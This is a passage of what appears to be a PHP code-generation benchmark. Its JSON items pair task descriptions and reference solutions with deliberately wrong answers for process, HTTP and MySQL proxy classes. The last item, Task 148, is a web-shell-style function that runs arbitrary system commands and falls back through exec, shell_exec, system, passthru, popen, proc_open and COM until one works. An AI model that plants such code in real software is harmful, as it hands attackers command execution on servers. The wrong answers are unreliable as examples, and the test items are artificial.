break;\n            case 'mysql_clear_password':\n                $password = array_merge(getBytes($this->account['password']), [0]);\n                break;\n            default:\n                $password = SecurityUtil::scramble411($this->account['password'], $this->salt);\n                break;\n        }\n        return $password;\n    }\n\n    public function send(...$data)\n    {\n        if ($this->isDuplex) {\n            if ($this->client->isConnected()) {\n                return $this->client->send(...$data);\n            } else {\n                return false;\n            }\n        } else {\n            $client = self::coPop($this->mysqlClient);\n            if ($client === false) {\n                return false;\n            }\n            if ($client->isConnected()) {\n                $result = $client->send(...$data);\n                $this->mysqlClient->push($client);\n                return $result;\n            }\n            return false;\n        }\n    }\n\n    public function recv(&$remain)\n    {\n        if ($this->isDuplex) {\n            $client = $this->client;\n            $data = $client->recv(-1);\n        } else {\n            $client = self::coPop($this->mysqlClient, $this->timeout);\n            if ($client === false) {\n                return false;\n            }\n            if ($client->isConnected()) {\n                $data = $client->recv($this->timeout / 500);\n            } else {\n                $data = '';\n            }\n            $this->mysqlClient->push($client);\n            if ($data === false && $client->errCode == 110) {\n                $data = true;\n            }\n            if ($data === '' || $data === false) {\n                $this->mysqlClient->close();\n            }\n        }\n        if ($data === '' || $data === false) {\n            $this->onClientClose($client);\n        } elseif (is_string($data)) {\n            $this->onClientReceive($client, $data);\n        }\n        return $data;\n    }\n\n    public function onClientClose(\\Swoole\\Coroutine\\Client $cli)\n    {\n        MySQLPool::destruct($cli, $this->connName);\n    }\n\n    public function onClientError(\\Swoole\\Coroutine\\Client $cli)\n    {\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 139,
    "wrong_result": "```php\nclass MysqlProxy\n{\n    private $isDuplex;\n    private $server;\n    private $serverFd;\n    private $charset;\n    private $account;\n    private $auth;\n    private $chan;\n    private $serverPublicKey;\n    private $salt;\n    private $connected;\n    private $timeout;\n    private $mysqlClient;\n    private $mysqlServer;\n    private $client;\n\n    public function __construct(swoole_server $server, int $fd, Swoole\\Coroutine\\Channel $chan)\n    {\n        $this->isDuplex = version_compare(swoole_version(), '4.5.0', '>=');\n        $this->server = $server;\n        $this->serverFd = $fd;\n        $this->chan = $chan;\n        $this->connected = false;\n        $this->timeout = 0.1;\n        $this->mysqlClient = new Swoole\\Coroutine\\Channel(1);\n        $this->mysqlServer = null;\n        $this->client = null;\n    }\n\n    public function connect(string $host, int $port, float $timeout = 0.1, int $tryStep = 0): ?Swoole\\Coroutine\\Client\n    {\n        $cli = new Swoole\\Coroutine\\Client(SWOOLE_SOCK_TCP);\n        $cli->set([\n            'open_length_check' => true,\n            'package_length_type' => 'N',\n            'package_length_offset' => 0,\n            'package_body_offset' => 4,\n            'package_max_length' => 2 ** 24,\n        ]);\n        if (!$cli->connect($host, $port, $timeout)) {\n            if ($tryStep < 3) {\n                $this->server->after(1000, function () use ($host, $port, $timeout, $tryStep) {\n                    $this->connect($host, $port, $timeout, $tryStep + 1);\n                });\n            }\n            return null;\n        }\n        $this->client = $cli;\n        return $cli;\n    }\n\n    public function onClientReceive(Swoole\\Coroutine\\Client $cli, string $data): void\n    {\n        $this->mysqlClient->push($data);\n    }\n\n    public function processAuth(string $pluginName): array\n    {\n        $auth = [];\n        switch ($pluginName) {\n            case 'mysql_native_password':\n                $auth['auth'] = $this->encryptPassword($this->account['password'], $this->salt);\n                break;\n            case 'caching_sha2_password':\n                $auth['auth'] = $this->encryptPassword($this->account['password'], $this->salt);\n                break;\n            default:\n                $auth['auth'] = '';\n                break;\n        }\n        return $auth;\n    }\n\n    public function send(...$data): bool\n    {\n        $data = pack('N', count($data)) . implode('', $data);\n        return $this->client->send($data);\n    }\n\n    public function recv(&$remain): mixed\n    {\n        $data = $this->mysqlClient->pop($this->timeout);\n        if ($data === false) {\n            return false;\n        }\n        $remain .= $data;\n        $len = unpack('N', $remain)[1];\n        if (strlen($remain) < $len + 4) {\n            return false;\n        }\n        $data = substr($remain, 4, $len);\n        $remain = substr($remain, $len + 4);\n        return $data;\n    }\n\n    public function onClientClose(Swoole\\Coroutine\\Client $cli): void\n    {\n        $this->connected = false;\n        $this->chan->push(false);\n    }\n\n    public function onClientError(Swoole\\Coroutine\\Client $cli): void\n    {\n        $this->connected = false;\n        $this->chan->push(false);\n    }\n}\n```"
  },
  {
    "Task_id": 137,
    "Instruction": "Task Description: Create a PHP class that manages a subprocess using proc_open, providing methods to initialize, communicate with, and terminate the process, while handling errors and resource cleanup.\n\nClass Description: The ProcessStream class manages a subprocess execution through pipes for stdin, stdout, and stderr communication. It handles process initialization, error checking, and proper resource cleanup.\n\nAttributes:\n- command: string - The command to be executed in the subprocess\n- stream: resource - The process resource created by proc_open\n- in: resource - The stdin pipe for writing to the subprocess\n- out: resource - The stdout pipe for reading from the subprocess\n\nMethods:\n- setCommand(string $command) -> void - Sets the command to be executed by the subprocess\n- initialize() -> void - Starts the subprocess, sets up communication pipes, and checks for startup errors\n- terminate() -> void - Closes all pipes and terminates the subprocess\n- getReadConnectionDescription() -> string - Returns a description of the process connection (for logging/debugging)",
    "Canonical_solution": "namespace Symfony\\Component\\Mailer\\Transport\\Smtp\\Stream;\n\nuse Symfony\\Component\\Mailer\\Exception\\TransportException;\n\nfinal class ProcessStream extends AbstractStream\n{\n    private string $command;\n\n    public function setCommand(string $command)\n    {\n        $this->command = $command;\n    }\n\n    public function initialize(): void\n    {\n        $descriptorSpec = [\n            0 => ['pipe', 'r'],\n            1 => ['pipe', 'w'],\n            2 => ['pipe', 'w'],\n        ];\n        $pipes = [];\n        $this->stream = proc_open($this->command, $descriptorSpec, $pipes);\n        stream_set_blocking($pipes[2], false);\n        if ($err = stream_get_contents($pipes[2])) {\n            throw new TransportException('Process could not be started: '.$err);\n        }\n        $this->in = &$pipes[0];\n        $this->out = &$pipes[1];\n    }\n\n    public function terminate(): void\n    {\n        if (null !== $this->stream) {\n            fclose($this->in);\n            fclose($this->out);\n            proc_close($this->stream);\n        }\n\n        parent::terminate();\n    }\n\n    protected function getReadConnectionDescription(): string\n    {\n        return 'process '.$this->command;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 145,
    "wrong_result": "```php\nclass ProcessStream {\n    private $command;\n    private $stream;\n    private $in;\n    private $out;\n\n    public function setCommand(string $command) {\n        $this->command = $command;\n    }\n\n    public function initialize() {\n        $descriptorspec = array(\n            0 => array(\"pipe\", \"r\"),  // stdin\n            1 => array(\"pipe\", \"w\"),  // stdout\n            2 => array(\"pipe\", \"w\")   // stderr\n        );\n\n        $this->stream = proc_open($this->command, $descriptorspec, $pipes);\n\n        if (is_resource($this->stream)) {\n            $this->in = $pipes[0];\n            $this->out = $pipes[1];\n        } else {\n            throw new Exception(\"Failed to start process\");\n        }\n    }\n\n    public function terminate() {\n        if (is_resource($this->in)) {\n            fclose($this->in);\n        }\n        if (is_resource($this->out)) {\n            fclose($this->out);\n        }\n        if (is_resource($this->stream)) {\n            proc_close($this->stream);\n        }\n    }\n\n    public function getReadConnectionDescription() {\n        return \"ProcessStream: {$this->command}\";\n    }\n}\n```"
  },
  {
    "Task_id": 14,
    "Instruction": "Task Description: Create a PHP class that implements HTTP client functionality using Symfony's HTTP client components to handle HTTP requests and responses.\n\nClass Description: The `HttpClientKernel` class is a Symfony HTTP client implementation that handles HTTP requests by sending them to a server and processing the responses. It supports various request methods, headers, cookies, and body content (including form data and file uploads).\n\nAttributes:\n- client: [HttpClientInterface] - The Symfony HTTP client instance used to send requests\n\nMethods:\n- __construct([HttpClientInterface $client = null]) -> [void] - Initializes the HTTP client. If no client is provided, creates a new instance. Requires Symfony HTTP client component.\n- handle([Request $request], [int $type = HttpKernelInterface::MAIN_REQUEST], [bool $catch = true]) -> [Response] - Processes an HTTP request, sends it using the client, and returns the response. Handles headers, cookies, and request body.\n- getBody([Request $request]) -> [AbstractPart|null] - Prepares the request body content. Returns null for GET/HEAD requests, TextPart for raw content, or FormDataPart for form data including files.\n- getHeaders([Request $request]) -> [array] - Prepares request headers including cookies from the request object. Returns an array of headers.",
    "Canonical_solution": "use Symfony\\Component\\HttpClient\\HttpClient;\nuse Symfony\\Component\\HttpFoundation\\Request;\nuse Symfony\\Component\\HttpFoundation\\Response;\nuse Symfony\\Component\\HttpFoundation\\ResponseHeaderBag;\nuse Symfony\\Component\\Mime\\Part\\AbstractPart;\nuse Symfony\\Component\\Mime\\Part\\DataPart;\nuse Symfony\\Component\\Mime\\Part\\Multipart\\FormDataPart;\nuse Symfony\\Component\\Mime\\Part\\TextPart;\nuse Symfony\\Contracts\\HttpClient\\HttpClientInterface;\n\nclass HttpClientKernel implements HttpKernelInterface\n{\n    private HttpClientInterface $client;\n\n    public function __construct(HttpClientInterface $client = null)\n    {\n        if (null === $client && !class_exists(HttpClient::class)) {\n            throw new \\LogicException(sprintf('You cannot use \"%s\" as the HttpClient component is not installed. Try running \"composer require symfony/http-client\".', __CLASS__));\n        }\n\n        $this->client = $client ?? HttpClient::create();\n    }\n\n    public function handle(Request $request, int $type = HttpKernelInterface::MAIN_REQUEST, bool $catch = true): Response\n    {\n        $headers = $this->getHeaders($request);\n        $body = '';\n        if (null !== $part = $this->getBody($request)) {\n            $headers = array_merge($headers, $part->getPreparedHeaders()->toArray());\n            $body = $part->bodyToIterable();\n        }\n        $response = $this->client->request($request->getMethod(), $request->getUri(), [\n            'headers' => $headers,\n            'body' => $body,\n        ] + $request->attributes->get('http_client_options', []));\n\n        $response = new Response($response->getContent(!$catch), $response->getStatusCode(), $response->getHeaders(!$catch));\n\n        $response->headers->remove('X-Body-File');\n        $response->headers->remove('X-Body-Eval');\n        $response->headers->remove('X-Content-Digest');\n\n        $response->headers = new class($response->headers->all()) extends ResponseHeaderBag {\n            protected function computeCacheControlValue(): string\n            {\n                return $this->getCacheControlHeader();\n            }\n        };\n\n        return $response;\n    }\n\n    private function getBody(Request $request): ?AbstractPart\n    {\n        if (\\in_array($request->getMethod(), ['GET', 'HEAD'])) {\n            return null;\n        }\n\n        if (!class_exists(AbstractPart::class)) {\n            throw new \\LogicException('You cannot pass non-empty bodies as the Mime component is not installed. Try running \"composer require symfony/mime\".');\n        }\n\n        if ($content = $request->getContent()) {\n            return new TextPart($content, 'utf-8', 'plain', '8bit');\n        }\n\n        $fields = $request->request->all();\n        foreach ($request->files->all() as $name => $file) {\n            $fields[$name] = DataPart::fromPath($file->getPathname(), $file->getClientOriginalName(), $file->getClientMimeType());\n        }\n\n        return new FormDataPart($fields);\n    }\n\n    private function getHeaders(Request $request): array\n    {\n        $headers = [];\n        foreach ($request->headers as $key => $value) {\n            $headers[$key] = $value;\n        }\n        $cookies = [];\n        foreach ($request->cookies->all() as $name => $value) {\n            $cookies[] = $name.'='.$value;\n        }\n        if ($cookies) {\n            $headers['cookie'] = implode('; ', $cookies);\n        }\n\n        return $headers;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 134,
    "wrong_result": "```php\n<?php\n\nuse Symfony\\Component\\HttpFoundation\\Request;\nuse Symfony\\Component\\HttpFoundation\\Response;\nuse Symfony\\Component\\HttpKernel\\HttpKernelInterface;\nuse Symfony\\Component\\Mime\\Part\\AbstractPart;\nuse Symfony\\Component\\Mime\\Part\\FormDataPart;\nuse Symfony\\Component\\Mime\\Part\\TextPart;\nuse Symfony\\Contracts\\HttpClient\\HttpClientInterface;\n\nclass HttpClientKernel implements HttpKernelInterface\n{\n    private HttpClientInterface $client;\n\n    public function __construct(HttpClientInterface $client = null)\n    {\n        $this->client = $client ?? HttpClient::create();\n    }\n\n    public function handle(Request $request, int $type = HttpKernelInterface::MAIN_REQUEST, bool $catch = true): Response\n    {\n        $headers = $this->getHeaders($request);\n        $body = $this->getBody($request);\n\n        $response = $this->client->request(\n            $request->getMethod(),\n            $request->getUri(),\n            [\n                'headers' => $headers,\n                'body' => $body,\n            ]\n        );\n\n        return new Response(\n            $response->getContent(),\n            $response->getStatusCode(),\n            $response->getHeaders()\n        );\n    }\n\n    private function getBody(Request $request): ?AbstractPart\n    {\n        if ($request->isMethod('GET') || $request->isMethod('HEAD')) {\n            return null;\n        }\n\n        if ($request->request->has('file')) {\n            $file = $request->files->get('file');\n            $content = fopen($file->getPathname(), 'r');\n            return new FormDataPart(new TextPart($content), 'file', ['filename' => $file->getClientOriginalName()]);\n        }\n\n        return new FormDataPart($request->request->all());\n    }\n\n    private function getHeaders(Request $request): array\n    {\n        $headers = $request->headers->all();\n        $cookies = $request->cookies->all();\n\n        foreach ($cookies as $name => $value) {\n            $headers['Cookie'][] = sprintf('%s=%s', $name, $value);\n        }\n\n        return $headers;\n    }\n}\n```"
  },
  {
    "Task_id": 140,
    "Instruction": "Task Description: Create a PHP class that facilitates the execution of shell commands as subprocesses, handling input/output streams, and providing process execution details.\n\nClass Description: The Process class provides a way to execute shell commands as subprocesses, capturing their output streams (stdout and stderr), return codes, and execution time. It includes methods for basic execution and error-checked execution variants.\n\nAttributes:\n\ncommand: [string] - The shell command to be executed\ncwd: [string|null] - The working directory for the command execution\nenv: [array] - Environment variables for the command\ndescriptors: [array] - Static array defining I/O streams configuration\nlog_run_times: [bool] - Static flag to enable execution time logging\nrun_times: [array] - Static array storing command execution time statistics\n\nMethods:\n\ncreate: [static](string $command, string|null $cwd = null, array $env = []) -> [Process] - Factory method to create a new Process instance\nrun: [](void) -> [ProcessRun] - Executes the command and returns execution details including stdout, stderr, and return code\nrun_check: [](void) -> [ProcessRun] - Executes the command and throws RuntimeException if return code is non-zero\nrun_check_stderr: [](void) -> [ProcessRun] - Executes the command and throws RuntimeException if return code is non-zero or if stderr contains unexpected output (with specific exception for known PSR-0 deprecation warning)",
    "Canonical_solution": "namespace WP_CLI;\n\nuse RuntimeException;\n\nclass Process {\n\tprivate $command;\n\tprivate $cwd;\n\tprivate $env;\n\tprivate static $descriptors = [\n\t\t0 => STDIN,\n\t\t1 => [ 'pipe', 'w' ],\n\t\t2 => [ 'pipe', 'w' ],\n\t];\n\tpublic static $log_run_times = false;\n\tpublic static $run_times = [];\n\n\tpublic static function create( $command, $cwd = null, $env = [] ) {\n\t\t$proc = new self();\n\t\t$proc->command = $command;\n\t\t$proc->cwd = $cwd;\n\t\t$proc->env = $env;\n\t\treturn $proc;\n\t}\n\n\tprivate function __construct() {}\n\n\tpublic function run() {\n\t\tUtils\\check_proc_available( 'Process::run' );\n\n\t\t$start_time = microtime( true );\n\t\t$pipes = [];\n\t\t$proc = Utils\\proc_open_compat( $this->command, self::$descriptors, $pipes, $this->cwd, $this->env );\n\n\t\t$stdout = stream_get_contents( $pipes[1] );\n\t\tfclose( $pipes[1] );\n\n\t\t$stderr = stream_get_contents( $pipes[2] );\n\t\tfclose( $pipes[2] );\n\n\t\t$return_code = proc_close( $proc );\n\n\t\t$run_time = microtime( true ) - $start_time;\n\n\t\tif ( self::$log_run_times ) {\n\t\t\tif ( ! isset( self::$run_times[ $this->command ] ) ) {\n\t\t\t\tself::$run_times[ $this->command ] = [ 0, 0 ];\n\t\t\t}\n\t\t\tself::$run_times[ $this->command ][0] += $run_time;\n\t\t\t++self::$run_times[ $this->command ][1];\n\t\t}\n\n\t\treturn new ProcessRun( [\n\t\t\t'stdout' => $stdout,\n\t\t\t'stderr' => $stderr,\n\t\t\t'return_code' => $return_code,\n\t\t\t'command' => $this->command,\n\t\t\t'cwd' => $this->cwd,\n\t\t\t'env' => $this->env,\n\t\t\t'run_time' => $run_time,\n\t\t] );\n\t}\n\n\tpublic function run_check() {\n\t\t$r = $this->run();\n\t\tif ( $r->return_code ) {\n\t\t\tthrow new RuntimeException( $r );\n\t\t}\n\t\treturn $r;\n\t}\n\n\tpublic function run_check_stderr() {\n\t\t$r = $this->run();\n\t\tif ( $r->return_code ) {\n\t\t\tthrow new RuntimeException( $r );\n\t\t}\n\t\tif ( ! empty( $r->stderr ) ) {\n\t\t\t$stderr_lines = array_filter( explode( \"\\n\", $r->stderr ) );\n\t\t\tif ( 1 === count( $stderr_lines ) ) {\n\t\t\t\t$stderr_line = $stderr_lines[0];\n\t\t\t\tif ( false !== strpos( $stderr_line, 'The PSR-0 `Requests_...` class names in the Request library are deprecated.' ) ) {\n\t\t\t\t\treturn $r;\n\t\t\t\t}\n\t\t\t}\n\t\t\tthrow new RuntimeException( $r );\n\t\t}\n\t\treturn $r;\n\t}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 145,
    "wrong_result": "```php\nclass Process\n{\n    private $command;\n    private $cwd;\n    private $env;\n    private $descriptors;\n    private static $log_run_times;\n    private static $run_times;\n\n    public function __construct(string $command, string $cwd = null, array $env = [])\n    {\n        $this->command = $command;\n        $this->cwd = $cwd;\n        $this->env = $env;\n        $this->descriptors = [\n            0 => ['pipe', 'r'],\n            1 => ['pipe', 'w'],\n            2 => ['pipe', 'w'],\n        ];\n    }\n\n    public static function create(string $command, string $cwd = null, array $env = []): Process\n    {\n        return new self($command, $cwd, $env);\n    }\n\n    public function run(): ProcessRun\n    {\n        $start = microtime(true);\n        $process = proc_open($this->command, $this->descriptors, $pipes, $this->cwd, $this->env);\n        $stdout = stream_get_contents($pipes[1]);\n        $stderr = stream_get_contents($pipes[2]);\n        $return_code = proc_close($process);\n        $end = microtime(true);\n        $execution_time = $end - $start;\n\n        if (self::$log_run_times) {\n            self::$run_times[] = $execution_time;\n        }\n\n        return new ProcessRun($stdout, $stderr, $return_code, $execution_time);\n    }\n\n    public function runCheck(): ProcessRun\n    {\n        $result = $this->run();\n        if ($result->getReturnCode() !== 0) {\n            throw new RuntimeException(\"Command failed with return code: {$result->getReturnCode()}\");\n        }\n        return $result;\n    }\n\n    public function runCheckStderr(): ProcessRun\n    {\n        $result = $this->run();\n        if ($result->getReturnCode() !== 0 || strpos($result->getStderr(), 'Deprecated') !== false) {\n            throw new RuntimeException(\"Command failed with return code: {$result->getReturnCode()}\");\n        }\n        return $result;\n    }\n\n    public static function enableRunTimeLogging(bool $enable): void\n    {\n        self::$log_run_times = $enable;\n    }\n\n    public static function getRunTimes(): array\n    {\n        return self::$run_times;\n    }\n}\n\nclass ProcessRun\n{\n    private $stdout;\n    private $stderr;\n    private $return_code;\n    private $execution_time;\n\n    public function __construct(string $stdout, string $stderr, int $return_code, float $execution_time)\n    {\n        $this->stdout = $stdout;\n        $this->stderr = $stderr;\n        $this->return_code = $return_code;\n        $this->execution_time = $execution_time;\n    }\n\n    public function getStdout(): string\n    {\n        return $this->stdout;\n    }\n\n    public function getStderr(): string\n    {\n        return $this->stderr;\n    }\n\n    public function getReturnCode(): int\n    {\n        return $this->return_code;\n    }\n\n    public function getExecutionTime(): float\n    {\n        return $this->execution_time;\n    }\n}\n```"
  },
  {
    "Task_id": 143,
    "Instruction": "Task Description: Create a PHP class that handles process execution and communication using pipes, specifically designed for logging purposes. The class should manage subprocess creation, input/output streams, and error handling.\n\nClass Description: ProcessHandler is a logging handler that executes a subprocess and communicates with it through pipes (stdin, stdout, stderr). It ensures proper process management, handles startup errors, and provides methods for writing input and reading errors.\n\nAttributes:\n- process: [resource|null] - The subprocess resource handle\n- command: [string] - The command to execute as a subprocess\n- cwd: [string|null] - The working directory for the subprocess\n- pipes: [array] - Array of file pointers for process pipes (stdin, stdout, stderr)\n\nMethods:\n- __construct(string $command, int|string|Level $level = Level::Debug, bool $bubble = true, ?string $cwd = null) -> [void] - Initializes the handler with command, log level, and working directory\n- write(LogRecord $record) -> [void] - Writes formatted log record to the process stdin\n- close() -> [void] - Closes all pipes and terminates the process\n- ensureProcessIsStarted() -> [void] - Ensures the subprocess is running (starts if not)\n- startProcess() -> [void] - Starts the subprocess using proc_open\n- handleStartupErrors() -> [void] - Checks for and handles any startup errors\n- selectErrorStream() -> [int|false] - Monitors the stderr pipe for activity\n- readProcessErrors() -> [string] - Reads and returns error output from stderr\n- writeProcessInput(string $string) -> [void] - Writes data to the process stdin",
    "Canonical_solution": "use Monolog\\Level;\nuse Monolog\\LogRecord;\n\nclass ProcessHandler extends AbstractProcessingHandler\n{\n    private $process;\n    private string $command;\n    private ?string $cwd;\n    private array $pipes = [];\n    protected const DESCRIPTOR_SPEC = [\n        0 => ['pipe', 'r'],\n        1 => ['pipe', 'w'],\n        2 => ['pipe', 'w'],\n    ];\n\n    public function __construct(string $command, int|string|Level $level = Level::Debug, bool $bubble = true, ?string $cwd = null)\n    {\n        if ($command === '') {\n            throw new \\InvalidArgumentException('The command argument must be a non-empty string.');\n        }\n        if ($cwd === '') {\n            throw new \\InvalidArgumentException('The optional CWD argument must be a non-empty string or null.');\n        }\n\n        parent::__construct($level, $bubble);\n\n        $this->command = $command;\n        $this->cwd = $cwd;\n    }\n\n    protected function write(LogRecord $record): void\n    {\n        $this->ensureProcessIsStarted();\n        $this->writeProcessInput($record->formatted);\n\n        $errors = $this->readProcessErrors();\n        if ($errors !== '') {\n            throw new \\UnexpectedValueException(sprintf('Errors while writing to process: %s', $errors));\n        }\n    }\n\n    private function ensureProcessIsStarted(): void\n    {\n        if (is_resource($this->process) === false) {\n            $this->startProcess();\n            $this->handleStartupErrors();\n        }\n    }\n\n    private function startProcess(): void\n    {\n        $this->process = proc_open($this->command, static::DESCRIPTOR_SPEC, $this->pipes, $this->cwd);\n        foreach ($this->pipes as $pipe) {\n            stream_set_blocking($pipe, false);\n        }\n    }\n\n    private function handleStartupErrors(): void\n    {\n        $selected = $this->selectErrorStream();\n        if (false === $selected) {\n            throw new \\UnexpectedValueException('Something went wrong while selecting a stream.');\n        }\n\n        $errors = $this->readProcessErrors();\n        if (is_resource($this->process) === false || $errors !== '') {\n            throw new \\UnexpectedValueException(\n                sprintf('The process \"%s\" could not be opened: ' . $errors, $this->command)\n            );\n        }\n    }\n\n    protected function selectErrorStream()\n    {\n        $empty = [];\n        $errorPipes = [$this->pipes[2]];\n        return stream_select($errorPipes, $empty, $empty, 1);\n    }\n\n    protected function readProcessErrors(): string\n    {\n        return (string) stream_get_contents($this->pipes[2]);\n    }\n\n    protected function writeProcessInput(string $string): void\n    {\n        fwrite($this->pipes[0], $string);\n    }\n\n    public function close(): void\n    {\n        if (is_resource($this->process)) {\n            foreach ($this->pipes as $pipe) {\n                fclose($pipe);\n            }\n            proc_close($this->process);\n            $this->process = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 145,
    "wrong_result": "```php\nclass ProcessHandler extends AbstractHandler\n{\n    private $process;\n    private $command;\n    private $cwd;\n    private $pipes;\n\n    public function __construct(string $command, int|string|Level $level = Level::Debug, bool $bubble = true, ?string $cwd = null)\n    {\n        parent::__construct($level, $bubble);\n        $this->command = $command;\n        $this->cwd = $cwd;\n    }\n\n    public function write(LogRecord $record): void\n    {\n        $this->ensureProcessIsStarted();\n        $this->writeProcessInput($this->getFormatter()->format($record));\n    }\n\n    public function close(): void\n    {\n        if ($this->process) {\n            foreach ($this->pipes as $pipe) {\n                fclose($pipe);\n            }\n            proc_close($this->process);\n        }\n    }\n\n    private function ensureProcessIsStarted(): void\n    {\n        if (!$this->process) {\n            $this->startProcess();\n        }\n    }\n\n    private function startProcess(): void\n    {\n        $descriptorspec = [\n            0 => ['pipe', 'r'],  // stdin\n            1 => ['pipe', 'w'],  // stdout\n            2 => ['pipe', 'w'],  // stderr\n        ];\n\n        $this->process = proc_open($this->command, $descriptorspec, $this->pipes, $this->cwd);\n        $this->handleStartupErrors();\n    }\n\n    private function handleStartupErrors(): void\n    {\n        if (!is_resource($this->process)) {\n            throw new \\RuntimeException('Failed to start process: ' . $this->command);\n        }\n    }\n\n    private function selectErrorStream(): int|false\n    {\n        $read = [$this->pipes[2]]; // stderr\n        $write = null;\n        $except = null;\n\n        return stream_select($read, $write, $except, 0);\n    }\n\n    private function readProcessErrors(): string\n    {\n        $errors = '';\n        while ($this->selectErrorStream() > 0) {\n            $errors .= fgets($this->pipes[2]);\n        }\n        return $errors;\n    }\n\n    private function writeProcessInput(string $string): void\n    {\n        fwrite($this->pipes[0], $string);\n        fflush($this->pipes[0]);\n    }\n}\n```"
  },
  {
    "Task_id": 146,
    "Instruction": "Task Description: Create a PHP class that manages a subprocess using proc_open, handling input/output streams and proper cleanup.\n\nClass Description: ProcessStream is a class that manages the lifecycle of a subprocess, including initialization, stream handling, and termination. It provides access to the subprocess's standard input and output streams while properly handling errors and resource cleanup.\n\nAttributes:\n- command: string - The command to be executed in the subprocess\n- stream: resource - The process resource created by proc_open\n- in: resource - The input stream (stdin) of the subprocess\n- out: resource - The output stream (stdout) of the subprocess\n\nMethods:\n- setCommand(string $command): void - Sets the command to be executed by the subprocess\n- initialize(): void - Starts the subprocess, sets up streams, and checks for startup errors\n- terminate(): void - Closes all streams and terminates the subprocess\n- getReadConnectionDescription(): string - Returns a description of the process connection",
    "Canonical_solution": "namespace Symfony\\Component\\Mailer\\Transport\\Smtp\\Stream;\n\nuse Symfony\\Component\\Mailer\\Exception\\TransportException;\n\nfinal class ProcessStream extends AbstractStream\n{\n    private string $command;\n\n    public function setCommand(string $command): void\n    {\n        $this->command = $command;\n    }\n\n    public function initialize(): void\n    {\n        $descriptorSpec = [\n            0 => ['pipe', 'r'],\n            1 => ['pipe', 'w'],\n            2 => ['pipe', '\\\\' === \\DIRECTORY_SEPARATOR ? 'a' : 'w'],\n        ];\n        $pipes = [];\n        $this->stream = proc_open($this->command, $descriptorSpec, $pipes);\n        stream_set_blocking($pipes[2], false);\n        if ($err = stream_get_contents($pipes[2])) {\n            throw new TransportException('Process could not be started: '.$err);\n        }\n        $this->in = &$pipes[0];\n        $this->out = &$pipes[1];\n    }\n\n    public function terminate(): void\n    {\n        if (null !== $this->stream) {\n            fclose($this->in);\n            fclose($this->out);\n            proc_close($this->stream);\n        }\n\n        parent::terminate();\n    }\n\n    protected function getReadConnectionDescription(): string\n    {\n        return 'process '.$this->command;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 145,
    "wrong_result": "```php\nclass ProcessStream {\n    private $command;\n    private $stream;\n    private $in;\n    private $out;\n\n    public function setCommand(string $command): void {\n        $this->command = $command;\n    }\n\n    public function initialize(): void {\n        $descriptorspec = array(\n            0 => array(\"pipe\", \"r\"),  // stdin\n            1 => array(\"pipe\", \"w\"),  // stdout\n            2 => array(\"pipe\", \"w\")   // stderr\n        );\n\n        $this->stream = proc_open($this->command, $descriptorspec, $pipes);\n\n        if (is_resource($this->stream)) {\n            $this->in = $pipes[0];\n            $this->out = $pipes[1];\n        } else {\n            throw new Exception(\"Failed to start subprocess\");\n        }\n    }\n\n    public function terminate(): void {\n        if (is_resource($this->in)) {\n            fclose($this->in);\n        }\n        if (is_resource($this->out)) {\n            fclose($this->out);\n        }\n        if (is_resource($this->stream)) {\n            proc_close($this->stream);\n        }\n    }\n\n    public function getReadConnectionDescription(): string {\n        return \"ProcessStream: \" . $this->command;\n    }\n}\n```"
  },
  {
    "Task_id": 148,
    "Instruction": "Task Description: Create a function that executes system commands using various PHP execution methods, with fallback options from most to least preferred, and returns the command output along with execution method information.\n\nFunction Description: The function attempts to execute a system command using multiple PHP execution methods in a prioritized order (COM, exec, shell_exec, system, passthru, popen, proc_open). It handles both Windows and Unix-like systems, sets the working directory, and properly manages process pipes and resources. The function returns the command output and indicates which execution method was successful.\n\nInput:\n- $cmd: [string] - The system command to be executed\n- $cwd: [string] - The working directory where the command should be executed\n- $com: [bool] (optional) - Flag to force using COM method on Windows (default: false)\n\nOutput:\n- Returns [array] with two elements:\n  - 'res': [string] - The output from the executed command\n  - 'msg': [string] - Status message indicating the execution method used or NULL if no output",
    "Canonical_solution": "function command($cmd, $cwd, $com = false) {\n    $iswin = substr(PHP_OS,0,3) == 'WIN' ? true : false;\n    $res = $msg = '';\n    \n    if($cwd == 'com' || $com) {\n        if($iswin && class_exists('COM')) {\n            $wscript = new COM('Wscript.Shell');\n            $exec = $wscript->exec('c:\\\\windows\\\\system32\\\\cmd.exe /c '.$cmd);\n            $stdout = $exec->StdOut();\n            $res = $stdout->ReadAll();\n            $msg = 'Wscript.Shell';\n        }\n    } else {\n        chdir($cwd);\n        $cwd = getcwd();\n        \n        if(function_exists('exec')) {\n            @exec($cmd, $res);\n            $res = join(\"\\n\", $res);\n            $msg = 'exec';\n        }\n        elseif(function_exists('shell_exec')) {\n            $res = @shell_exec($cmd);\n            $msg = 'shell_exec';\n        }\n        elseif(function_exists('system')) {\n            ob_start();\n            @system($cmd);\n            $res = ob_get_contents();\n            ob_end_clean();\n            $msg = 'system';\n        }\n        elseif(function_exists('passthru')) {\n            ob_start();\n            @passthru($cmd);\n            $res = ob_get_contents();\n            ob_end_clean();\n            $msg = 'passthru';\n        }\n        elseif(function_exists('popen')) {\n            $fp = @popen($cmd, 'r');\n            if($fp) {\n                while(!feof($fp)) {\n                    $res .= fread($fp, 1024);\n                }\n            }\n            @pclose($fp);\n            $msg = 'popen';\n        }\n        elseif(function_exists('proc_open')) {\n            $env = $iswin ? array('path' => 'c:\\\\windows\\\\system32') : array('path' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');\n            $des = array(\n                0 => array(\"pipe\", \"r\"),\n                1 => array(\"pipe\", \"w\"),\n                2 => array(\"pipe\", \"w\")\n            );\n            $process = @proc_open($cmd, $des, $pipes, $cwd, $env);\n            \n            if(is_resource($process)) {\n                fwrite($pipes[0], $cmd);\n                fclose($pipes[0]);\n                $res .= stream_get_contents($pipes[1]);\n                fclose($pipes[1]);\n                $res .= stream_get_contents($pipes[2]);\n                fclose($pipes[2]);\n            }\n            @proc_close($process);\n            $msg = 'proc_open';\n        }\n    }\n    \n    $msg = $res == '' ? '<h1>NULL</h1>' : '<h2>\u5229\u7528'.$msg.'\u6267\u884c\u6210\u529f</h2>';\n    return array('res' => $res, 'msg' => $msg);\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 145,
